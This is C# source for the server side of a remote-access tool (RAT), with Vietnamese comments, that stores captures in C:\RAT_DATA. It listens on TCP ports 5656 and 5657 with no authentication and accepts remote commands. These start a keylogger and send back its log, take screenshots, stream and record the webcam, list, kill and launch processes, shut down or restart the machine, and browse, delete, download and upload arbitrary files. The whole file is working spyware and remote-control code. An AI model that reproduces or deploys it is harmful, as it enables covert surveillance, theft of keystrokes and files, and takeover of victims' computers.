using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using Microsoft.Win32;
using System.IO;
using System.Diagnostics;
using System.Drawing.Imaging;
using System.Threading;
using KeyLogger;
using AForge.Video;
using AForge.Video.DirectShow;
using Accord.Video.FFMPEG; // Thư viện quay phim bạn vừa tải
using System.Runtime.ExceptionServices; // Bắt buộc có dòng này
using System.Security;
namespace ServerApp
{
    public partial class server : Form
    {
        Thread serverThread; // Luồng chính để chạy Server lắng nghe
        Thread tklog = null; // Luồng riêng cho Keylogger để không chặn UI
        // --- KHAI BÁO BIẾN WEBCAM (THÊM MỚI) ---
        Thread videoServerThread; // Luồng chạy server video (Port 5657)
        VideoCaptureDevice videoSource; // Thiết bị Webcam
        VideoFileWriter writer;   // Biến ghi hình của Accord
        bool isStreaming = false;
        bool isRecording = false;
        Socket videoClient;       // Socket gửi ảnh
        string currentVideoFile = "";
        string dataFolder = @"C:\RAT_DATA";
        // ---------------------------------------
        public server()
        {
            InitializeComponent();
            CheckForIllegalCrossThreadCalls = false; // Cho phép truy cập UI từ luồng khác (dùng cẩn thận)
            this.FormClosing += new FormClosingEventHandler(server_FormClosing);
            // Tạo thư mục lưu dữ liệu nếu chưa có
            if (!Directory.Exists(dataFolder))
            {
                Directory.CreateDirectory(dataFolder);
            }
            // Xóa file log cũ khi khởi động lại server để tránh file bị phình to
            try
            {
                if (File.Exists(KeyLogger.appstart.path))
                    File.Delete(KeyLogger.appstart.path);
            }
            catch { }
        }

        // Đảm bảo ngắt toàn bộ tiến trình khi đóng Form
        private void server_FormClosing(object sender, FormClosingEventArgs e)
        {
            StopWebcam();
            System.Diagnostics.Process.GetCurrentProcess().Kill();
        }

        // Sự kiện nút "Open Server"
        private void button1_Click(object sender, EventArgs e)
        {
            ((Button)sender).Enabled = false;
            ((Button)sender).Text = "Running...";

            // Chạy server trên một luồng nền (Background Thread)
            serverThread = new Thread(StartServerLoop);
            serverThread.IsBackground = true;
            serverThread.Start();
            // --- THÊM MỚI: Chạy Server Video ở Port 5657 ---
            videoServerThread = new Thread(StartVideoServer);
            videoServerThread.IsBackground = true;
            videoServerThread.Start();
        }

        // Vòng lặp chính: Lắng nghe kết nối TCP tại Port 5656
        private void StartServerLoop()
        {
            try
            {
                IPEndPoint ip = new IPEndPoint(IPAddress.Any, 5656);
                Program.server = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                Program.server.Bind(ip);
                Program.server.Listen(100); // Hàng đợi tối đa 100 kết nối

                while (true)
                {
                    try
                    {
                        // Chấp nhận kết nối từ Client (Python Web Server)
                        Program.client = Program.server.Accept();
                        Program.ns = new NetworkStream(Program.client);
                        Program.nr = new StreamReader(Program.ns);
                        Program.nw = new StreamWriter(Program.ns);
                        Program.nw.AutoFlush = true; // Tự động đẩy dữ liệu đi không cần buffer

                        // Chuyển sang xử lý lệnh
                        HandleClientCommunication();

                    }
                    catch { }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("Port 5656 Error: " + ex.Message);
                Environment.Exit(0);
            }
        }

        // Phân tích cú pháp lệnh gửi từ Client
        // File: server.cs - Cập nhật hàm HandleClientCommunication

        private void HandleClientCommunication()
        {
            String s = "";
            while (true)
            {
                receiveSignal(ref s);
                switch (s)
                {
                    // --- NHÓM 1: CÁC MODULE CŨ ---
                    case "KEYLOG": keylog(); break;
                    case "PROCESS": process(); break;
                    case "APPLICATION": application(); break;
                    case "TAKEPIC": takepic(); break;
                    case "SHUTDOWN": Process.Start("ShutDown", "-s"); break;
                    case "RESTART": Process.Start("shutdown", "/r /t 0"); break;

                    // --- NHÓM 2: WEBCAM (GOM VÀO 1 HÀM) ---
                    case "WEBCAM_START":
                    case "WEBCAM_STOP":
                    case "WEBCAM_RECORD_ON":
                    case "WEBCAM_RECORD_OFF":
                        WebcamHandler(s); // Truyền lệnh con vào xử lý
                        break;

                    // --- NHÓM 3: FILE MANAGER (GOM VÀO 1 HÀM) ---
                    case "FILE":
                        // Client gửi "FILE" -> Server vào đây -> Đọc tiếp "GET_FILES"
                        string subCommand = Program.nr.ReadLine();

                        // 2. Truyền lệnh con vào hàm xử lý
                        FileHandler(subCommand);
                        break;

                    case "QUIT": return;
                }
            }
        }

        // Hàm tiện ích để đọc dòng lệnh an toàn
        public void receiveSignal(ref String s)
        {
            try { s = Program.nr.ReadLine(); if (s == null) s = "QUIT"; }
            catch { s = "QUIT"; }
        }

        // --- MODULE KEYLOGGER ---
        public void keylog()
        {
            KeyLogger.appstart.path = Application.StartupPath + @"\keylog_cache.txt";
            String s = "";

            while (true)
            {
                receiveSignal(ref s);
                switch (s)
                {
                    case "HOOK": // Bắt đầu ghi phím
                        if (tklog == null || !tklog.IsAlive)
                        {
                            tklog = new Thread(new ThreadStart(KeyLogger.InterceptKeys.startKLog));
                            tklog.SetApartmentState(ApartmentState.STA);
                            tklog.Start();
                        }
                        break;

                    case "UNHOOK": // Dừng ghi phím
                        if (tklog != null && tklog.IsAlive)
                        {
                            try { tklog.Abort(); } catch { }
                            tklog = null;
                        }
                        break;

                    case "STATUS": // Kiểm tra trạng thái để hiển thị lên Web
                        bool isRunning = (tklog != null && tklog.IsAlive);
                        Program.nw.WriteLine(isRunning ? "RUNNING" : "STOPPED");
                        Program.nw.Flush();
                        break;

                    case "CLEAR": // Xóa file log
                        try { File.WriteAllText(KeyLogger.appstart.path, ""); } catch { }
                        Program.nw.WriteLine("Logs Cleared");
                        Program.nw.Flush();
                        break;

                    case "PRINT": // Đọc file log gửi về Client
                        String log = "";
                        if (File.Exists(KeyLogger.appstart.path))
                        {
                            try
                            {
                                using (FileStream fs = new FileStream(KeyLogger.appstart.path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                                using (StreamReader sr = new StreamReader(fs))
                                {
                                    log = sr.ReadToEnd();
                                }
                            }
                            catch { log = "Reading..."; }
                        }
                        if (string.IsNullOrEmpty(log)) log = " ";
                        Program.nw.WriteLine(log);
                        Program.nw.Flush();
                        break;

                    case "QUIT": return;
                }
            }
        }

        // --- MODULE SCREENSHOT ---
        public void takepic()
        {
            String ss = "";
            while (true)
            {
                receiveSignal(ref ss);
                if (ss == "QUIT") return;
                if (ss == "TAKE")
                {
                    try
                    {
                        // 1. Chụp màn hình
                        Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                        Graphics g = Graphics.FromImage(bmp);
                        g.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);

                        // 2. LƯU FILE VÀO C:\RAT_DATA (THÊM MỚI)
                        try
                        {
                            string photoName = "Screen_" + DateTime.Now.ToString("yyyyMMdd_HHmmss") + ".png";
                            string savePath = Path.Combine(dataFolder, photoName);
                            bmp.Save(savePath, ImageFormat.Png);
                        }
                        catch { /* Bỏ qua lỗi lưu file nếu ổ cứng đầy/lỗi quyền */ }

                        // 3. Gửi qua mạng về Client (Giữ nguyên logic cũ để hiện lên Web)
                        MemoryStream ms = new MemoryStream();
                        bmp.Save(ms, ImageFormat.Bmp);
                        byte[] b = ms.ToArray();
                        Program.nw.WriteLine(b.Length.ToString());
                        Program.nw.Flush();
                        Program.client.Send(b);
                    }
                    catch { Program.nw.WriteLine("0"); Program.nw.Flush(); }
                }
            }
        }

        // --- MODULE PROCESS & APPLICATION ---
        // Sử dụng chung logic ProcessHandler để giảm lặp code
        public void application() { ProcessHandler("App"); }
        public void process() { ProcessHandler("All"); }

        private void ProcessHandler(string mode)
        {
            String ss = "";
            while (true)
            {
                receiveSignal(ref ss);
                if (ss == "QUIT") return;

                if (ss == "XEM") // Lấy danh sách
                {
                    Process[] pr = Process.GetProcesses();
                    List<Process> filteredList = new List<Process>();
                    foreach (Process p in pr)
                    {
                        // Nếu mode là App thì chỉ lấy cửa sổ có tiêu đề
                        if (mode == "All" || p.MainWindowTitle.Length > 0) filteredList.Add(p);
                    }

                    // Sắp xếp danh sách
                    if (mode == "App") filteredList = filteredList.OrderBy(p => p.MainWindowTitle).ToList();
                    else filteredList = filteredList.OrderBy(p => p.ProcessName).ToList();

                    // Gửi số lượng trước
                    Program.nw.WriteLine(filteredList.Count.ToString()); Program.nw.Flush();

                    // Gửi chi tiết từng Process
                    foreach (Process p in filteredList)
                    {
                        if (mode == "App") Program.nw.WriteLine(p.MainWindowTitle);
                        else Program.nw.WriteLine(p.ProcessName);
                        Program.nw.Flush();
                        Program.nw.WriteLine(p.Id.ToString()); Program.nw.Flush();
                        Program.nw.WriteLine(p.Threads.Count.ToString()); Program.nw.Flush();
                    }
                }
                else if (ss == "KILL") // Diệt tiến trình
                {
                    receiveSignal(ref ss);
                    if (ss == "KILLID")
                    {
                        string id = Program.nr.ReadLine();
                        try
                        {
                            Process p = Process.GetProcessById(int.Parse(id));
                            string pName = (mode == "App") ? p.MainWindowTitle : p.ProcessName;
                            p.Kill();
                            Program.nw.WriteLine($"Successfully killed: {pName} (ID: {id})");
                        }
                        catch (Exception ex) { Program.nw.WriteLine("Failed: " + ex.Message.Replace("\n", " ")); }
                        Program.nw.Flush();
                    }
                }
                else if (ss == "START") // Mở tiến trình mới
                {
                    receiveSignal(ref ss);
                    if (ss == "STARTID")
                    {
                        string name = Program.nr.ReadLine();
                        try
                        {
                            Process.Start(name);
                            Program.nw.WriteLine("Successfully started: " + name);
                        }
                        catch (Exception ex) { Program.nw.WriteLine("Failed: " + ex.Message.Replace("\n", " ")); }
                        Program.nw.Flush();
                    }
                }
            }
        }
        // ==========================================================
        // KHU VỰC HÀM XỬ LÝ WEBCAM & RECORDING (THÊM MỚI TOÀN BỘ)
        // ==========================================================

        // 1. Hàm khởi tạo Server Video tại Port 5657
        private void StartVideoServer()
        {
            try
            {
                IPEndPoint ip = new IPEndPoint(IPAddress.Any, 5657);
                Socket vServer = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                vServer.Bind(ip);
                vServer.Listen(10);
                while (true)
                {
                    videoClient = vServer.Accept();
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("Lỗi Port 5657: " + ex.Message);
            }
        }

        // 2. Bật Webcam
        [HandleProcessCorruptedStateExceptions]
        [SecurityCritical]
        void StartWebcam()
        {
            try
            {
                FilterInfoCollection videos = new FilterInfoCollection(FilterCategory.VideoInputDevice);

                if (videos.Count == 0)
                {
                    MessageBox.Show("Lỗi: Không tìm thấy Webcam nào!");
                    return;
                }

                // Lấy Camera đầu tiên
                // Nếu gặp OBS Camera lỗi, thuộc tính bên trên sẽ chặn việc sập nguồn
                videoSource = new VideoCaptureDevice(videos[0].MonikerString);
                videoSource.NewFrame += new NewFrameEventHandler(video_NewFrame);
                videoSource.Start();
            }
            catch (Exception ex)
            {
                // Bây giờ nó sẽ hiện lỗi ra đây thay vì tắt bụp chương trình
                MessageBox.Show("Đã bỏ qua lỗi Driver Camera: " + ex.Message);
            }
        }

        // 3. Tắt Webcam và đóng file ghi hình
        void StopWebcam()
        {
            if (videoSource != null && videoSource.IsRunning)
            {
                videoSource.SignalToStop();
                videoSource = null;
            }

            // Sửa đoạn này để dọn dẹp sạch sẽ writer
            if (writer != null)
            {
                try
                {
                    writer.Close();
                    writer.Dispose();
                }
                catch { }
                writer = null; // <--- QUAN TRỌNG
            }
        }

        // 4. Bắt đầu Ghi hình (Dùng Accord)
        void StartRecording()
        {
            try
            {
                // 1. Tạo tên file .mp4 và ghép với đường dẫn C:\RAT_DATA
                string fileName = "Record_" + DateTime.Now.ToString("yyyyMMdd_HHmmss") + ".avi";
                currentVideoFile = Path.Combine(dataFolder, fileName);

                // 2. QUAN TRỌNG: Reset writer cũ nếu có để tránh lỗi ObjectDisposed
                if (writer != null)
                {
                    writer.Dispose();
                    writer = null;
                }

                isRecording = true;
            }
            catch (Exception ex) { MessageBox.Show("Lỗi bật ghi hình: " + ex.Message); }
        }

        // 5. Sự kiện xử lý từng khung hình (Quan trọng)
        private void video_NewFrame(object sender, NewFrameEventArgs eventArgs)
        {
            try
            {
                // Clone ảnh để xử lý
                Bitmap image = (Bitmap)eventArgs.Frame.Clone();

                // 1. GHI HÌNH (RECORD)
                if (isRecording)
                {
                    try
                    {
                        // Nếu writer chưa mở -> Mở mới
                        if (writer == null)
                        {
                            writer = new VideoFileWriter();
                            
                            // --- XỬ LÝ KÍCH THƯỚC LẺ (QUAN TRỌNG) ---
                            // FFmpeg sẽ sập ngay lập tức nếu chiều rộng/cao là số lẻ
                            int w = image.Width;
                            int h = image.Height;
                            if (w % 2 != 0) w--; // Giảm 1 pixel nếu lẻ
                            if (h % 2 != 0) h--;
                            
                            // Mở file AVI với kích thước CHẴN và Codec MPEG4
                            // Bitrate 1500000 (1.5 Mbps) là đủ đẹp và nhẹ
                            writer.Open(currentVideoFile, w, h, 25, VideoCodec.MPEG4, 1500000);
                        }

                        // Ghi hình (Chỉ ghi khi writer đã mở thành công)
                        if (writer.IsOpen)
                        {
                            // Lưu ý: Nếu ảnh gốc là lẻ, Accord thường tự crop nhẹ để vừa với kích thước chẵn đã Open
                            // Nên ta cứ truyền nguyên ảnh gốc vào
                            writer.WriteVideoFrame(image);
                        }
                    }
                    catch (Exception)
                    {
                        // Nếu lỗi ghi frame -> Tắt ghi hình luôn để tránh crash ứng dụng
                        isRecording = false;
                        if (writer != null) { try { writer.Dispose(); } catch {} writer = null; }
                    }
                }

                // 2. STREAMING (Giữ nguyên)
                if (isStreaming && videoClient != null && videoClient.Connected)
                {
                    using (MemoryStream ms = new MemoryStream())
                    {
                        EncoderParameters myEncoderParameters = new EncoderParameters(1);
                        myEncoderParameters.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, 50L);
                        image.Save(ms, GetEncoderInfo("image/jpeg"), myEncoderParameters);
                        
                        byte[] buffer = ms.ToArray();
                        byte[] sizeInfo = Encoding.ASCII.GetBytes(buffer.Length.ToString() + "\n");
                        videoClient.Send(sizeInfo);
                        videoClient.Send(buffer);
                    }
                }
                
                image.Dispose();
            }
            catch { }
        }

        // 6. Hàm phụ trợ nén ảnh
        private static ImageCodecInfo GetEncoderInfo(String mimeType)
        {
            ImageCodecInfo[] codecs = ImageCodecInfo.GetImageEncoders();
            foreach (ImageCodecInfo codec in codecs)
                if (codec.MimeType == mimeType) return codec;
            return null;
        }

        // 7. MODULE: Xử lý Webcam & Quay phim
        private void WebcamHandler(string command)
        {
            switch (command)
            {
                case "WEBCAM_START":
                    isStreaming = true;
                    StartWebcam();
                    Program.nw.WriteLine("Webcam Started");
                    break;

                case "WEBCAM_STOP":
                    isStreaming = false;
                    isRecording = false;
                    StopWebcam();
                    Program.nw.WriteLine("Webcam Stopped");
                    break;

                case "WEBCAM_RECORD_ON":
                    StartRecording();
                    Program.nw.WriteLine("Recording Started");
                    break;

                case "WEBCAM_RECORD_OFF":
                    isRecording = false;
                    Thread.Sleep(100); // Đợi luồng ghi nhả file

                    if (writer != null)
                    {
                        try { writer.Close(); writer.Dispose(); } catch { }
                        writer = null; // Reset
                    }

                    Program.nw.WriteLine("Recording Saved");
                    break;
            }
            Program.nw.Flush();
        }
        // MODULE: Quản lý File (File Explorer)
        private void FileHandler(string command)
        {
            try
            {
                switch (command)
                {
                    // --- 1. XEM DANH SÁCH FILE/THƯ MỤC ---
                    case "GET_FILES":
                        string path = Program.nr.ReadLine(); // Đọc đường dẫn
                        List<string> items = new List<string>();

                        if (string.IsNullOrEmpty(path) || path == "ROOT")
                        {
                            DriveInfo[] drives = DriveInfo.GetDrives();
                            foreach (DriveInfo d in drives)
                                if (d.IsReady) items.Add($"[DRIVE]|{d.Name}|{d.TotalSize}");
                        }
                        else if (Directory.Exists(path))
                        {
                            string[] dirs = Directory.GetDirectories(path);
                            foreach (string d in dirs) items.Add($"[FOLDER]|{Path.GetFileName(d)}|0");

                            string[] files = Directory.GetFiles(path);
                            foreach (string f in files)
                            {
                                FileInfo fi = new FileInfo(f);
                                items.Add($"[FILE]|{Path.GetFileName(f)}|{fi.Length}");
                            }
                        }

                        Program.nw.WriteLine(items.Count.ToString());
                        Program.nw.Flush();
                        foreach (string item in items) { Program.nw.WriteLine(item); Program.nw.Flush(); }
                        break;

                    // --- 2. XÓA FILE/FOLDER ---
                    case "DELETE_FILE":
                        string targetPath = Program.nr.ReadLine();
                        if (File.Exists(targetPath))
                        {
                            File.Delete(targetPath);
                            Program.nw.WriteLine("Đã xóa file.");
                        }
                        else if (Directory.Exists(targetPath))
                        {
                            Directory.Delete(targetPath, true);
                            Program.nw.WriteLine("Đã xóa thư mục.");
                        }
                        else Program.nw.WriteLine("Đường dẫn không tồn tại.");
                        Program.nw.Flush();
                        break;

                    // --- 3. DOWNLOAD (Tải về Client) ---
                    case "DOWNLOAD_FILE":
                        string downPath = Program.nr.ReadLine();
                        if (File.Exists(downPath))
                        {
                            FileInfo fi = new FileInfo(downPath);
                            Program.nw.WriteLine(fi.Length.ToString());
                            Program.nw.Flush();
                            Program.client.SendFile(downPath);
                        }
                        else { Program.nw.WriteLine("0"); Program.nw.Flush(); }
                        break;

                    // --- 4. UPLOAD (Nhận từ Client) - Sử dụng Chunking an toàn ---
                    case "UPLOAD_FILE":
                        string savePath = "";
                        // Vét sạch dòng trống để tránh lỗi "Ghost Newline"
                        while (string.IsNullOrWhiteSpace(savePath))
                        {
                            if (Program.nr.Peek() == -1) break;
                            savePath = Program.nr.ReadLine();
                        }
                        string sizeStr = Program.nr.ReadLine(); // Đọc kích thước

                        long dataSize;
                        if (!string.IsNullOrEmpty(savePath) && long.TryParse(sizeStr, out dataSize))
                        {
                            // Đọc dữ liệu theo từng khối (Chunk)
                            StringBuilder b64Builder = new StringBuilder((int)dataSize);
                            char[] buffer = new char[4096];
                            long totalRead = 0;

                            while (totalRead < dataSize)
                            {
                                int toRead = (int)Math.Min(buffer.Length, dataSize - totalRead);
                                int read = Program.nr.Read(buffer, 0, toRead);
                                if (read == 0) break;
                                b64Builder.Append(buffer, 0, read);
                                totalRead += read;
                            }

                            if (totalRead >= dataSize)
                            {
                                try
                                {
                                    byte[] fileBytes = Convert.FromBase64String(b64Builder.ToString());
                                    File.WriteAllBytes(savePath, fileBytes);
                                    Program.nw.WriteLine("Upload thành công!");
                                }
                                catch { Program.nw.WriteLine("Lỗi: File hỏng (Base64 sai)."); }
                            }
                            else Program.nw.WriteLine($"Lỗi: Mới nhận {totalRead}/{dataSize} bytes.");
                        }
                        else Program.nw.WriteLine("Lỗi: Header không hợp lệ.");

                        Program.nw.Flush();
                        break;
                }
            }
            catch (Exception ex)
            {
                // Gửi lỗi về Client nếu có sự cố bất ngờ
                Program.nw.WriteLine("Lỗi Server: " + ex.Message);
                Program.nw.Flush();
            }
        }
    }
}